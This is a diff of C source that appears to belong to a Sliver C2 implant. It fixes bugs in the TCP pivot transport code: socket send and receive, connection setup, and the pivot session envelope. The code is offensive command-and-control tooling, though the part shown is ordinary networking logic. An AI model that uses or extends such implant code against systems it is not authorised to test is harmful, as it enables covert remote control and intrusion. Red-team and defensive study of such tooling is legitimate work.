@@ -10,21 +10,21 @@ BOOL SocketSend
 	DWORD dwNumberOfBytesSent = 0;
 	DWORD dwTotal = 0;
 	DWORD dwZeroTimeout = 0;
+	PBYTE pTemp = NULL;
+	DWORD cbTemp = 0;
 
+	cbTemp = sizeof(DWORD) + pBuffer->cbBuffer;
+	pTemp = ALLOC(cbTemp);
+	memcpy(pTemp, &pBuffer->cbBuffer, sizeof(DWORD));
+	memcpy(pTemp + sizeof(DWORD), pBuffer->pBuffer, pBuffer->cbBuffer);
 	EnterCriticalSection(&pSliverTcpClient->Lock);
-	if (!setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &pSliverTcpClient->dwWriteDeadline, sizeof(pSliverTcpClient->dwWriteDeadline))) {
+	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &pSliverTcpClient->dwWriteDeadline, sizeof(pSliverTcpClient->dwWriteDeadline))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
 	}
 
-	dwNumberOfBytesSent = send(pSliverTcpClient->Sock, &pBuffer->cbBuffer, sizeof(pBuffer->cbBuffer), 0);
-	if (dwNumberOfBytesSent == SOCKET_ERROR || dwNumberOfBytesSent != sizeof(pBuffer->cbBuffer)) {
-		LOG_ERROR("send", WSAGetLastError());
-		goto CLEANUP;
-	}
-
-	while (dwTotal < pBuffer->cbBuffer) {
-		dwNumberOfBytesSent = send(pSliverTcpClient->Sock, &pBuffer->pBuffer[dwTotal], pBuffer->cbBuffer - dwTotal, 0);
+	while (dwTotal < cbTemp) {
+		dwNumberOfBytesSent = send(pSliverTcpClient->Sock, &pTemp[dwTotal], cbTemp - dwTotal, 0);
 		if (dwNumberOfBytesSent == SOCKET_ERROR) {
 			LOG_ERROR("send", WSAGetLastError());
 			goto CLEANUP;
@@ -35,12 +35,13 @@ BOOL SocketSend
 
 	Result = TRUE;
 CLEANUP:
-	if (!setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
+	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_SNDTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
 	}
 
 	LeaveCriticalSection(&pSliverTcpClient->Lock);
+	FREE(pTemp);
 
 	return Result;
 }
@@ -56,18 +57,19 @@ PBUFFER SocketRecv
 	DWORD dwZeroTimeout = 0;
 
 	EnterCriticalSection(&pSliverTcpClient->Lock);
-	if (!setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &pSliverTcpClient->dwReadDeadline, sizeof(pSliverTcpClient->dwReadDeadline))) {
+	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &pSliverTcpClient->dwReadDeadline, sizeof(pSliverTcpClient->dwReadDeadline))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
 	}
 
 	Result = ALLOC(sizeof(BUFFER));
-	dwNumberOfBytesRecv = send(pSliverTcpClient->Sock, &Result->cbBuffer, sizeof(Result->cbBuffer), 0);
+	dwNumberOfBytesRecv = recv(pSliverTcpClient->Sock, &Result->cbBuffer, sizeof(Result->cbBuffer), 0);
 	if (dwNumberOfBytesRecv == SOCKET_ERROR || dwNumberOfBytesRecv != sizeof(Result->cbBuffer)) {
 		LOG_ERROR("recv", WSAGetLastError());
 		goto CLEANUP;
 	}
 
+	Result->pBuffer = ALLOC(Result->cbBuffer);
 	while (dwTotal < Result->cbBuffer) {
 		dwNumberOfBytesRecv = recv(pSliverTcpClient->Sock, &Result->pBuffer[dwTotal], Result->cbBuffer - dwTotal, 0);
 		if (dwNumberOfBytesRecv == SOCKET_ERROR) {
@@ -79,7 +81,7 @@ PBUFFER SocketRecv
 	}
 
 CLEANUP:
-	if (!setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
+	if (setsockopt(pSliverTcpClient->Sock, SOL_SOCKET, SO_RCVTIMEO, &dwZeroTimeout, sizeof(dwZeroTimeout))) {
 		LOG_ERROR("setsockopt", WSAGetLastError());
 		goto CLEANUP;
 	}
@@ -102,10 +104,11 @@ PSLIVER_TCP_CLIENT TcpInit()
 	BOOL IsOk = FALSE;
 
 	pResult = ALLOC(sizeof(SLIVER_TCP_CLIENT));
-	pResult->lpHost = DuplicateStrA(pResult, 0);
+	pResult->lpHost = DuplicateStrA(szHost, 0);
 	pResult->dwReadDeadline = dwReadDeadline * 1000;
 	pResult->dwWriteDeadline = dwWriteDeadline * 1000;
 	pResult->Sock = INVALID_SOCKET;
+	pResult->dwPort = dwPort;
 
 	SecureZeroMemory(&WsaData, sizeof(WsaData));
 	ErrorCode = WSAStartup(MAKEWORD(2, 2), &WsaData);
@@ -193,7 +196,7 @@ BOOL TcpStart
 	Addr.sin_family = AF_INET;
 	Addr.sin_port = htons(pSliverTcpClient->dwPort);
 
-	if (!connect(pSliverTcpClient->Sock, &Addr, sizeof(Addr))) {
+	if (connect(pSliverTcpClient->Sock, &Addr, sizeof(Addr))) {
 		LOG_ERROR("connect", WSAGetLastError());
 		goto CLEANUP;
 	}
@@ -366,7 +369,7 @@ BOOL TcpSend
 	if (pEnvelope->uType != MsgPivotPeerPing && pEnvelope->uType != MsgPivotPeerEnvelope) {
 		pPivotPeerEnvelope = ALLOC(sizeof(PIVOT_PEER_ENVELOPE));
 		pPivotPeerEnvelope->uType = MsgPivotSessionEnvelope;
-		pPivotPeerEnvelope->pPivotSessionID = BufferInit(pConfig->szPivotSessionID, 32);
+		pPivotPeerEnvelope->pPivotSessionID = BufferInit(pConfig->PivotSessionID, sizeof(pConfig->PivotSessionID));
 		pPivotPeerEnvelope->pData = SliverEncrypt(pConfig, pPlainText, TRUE);
 		pPivotPeerEnvelope->cPivotPeers = 1;
 		pPivotPeerEnvelope->PivotPeers = ALLOC(sizeof(PPIVOT_PEER) * pPivotPeerEnvelope->cPivotPeers);
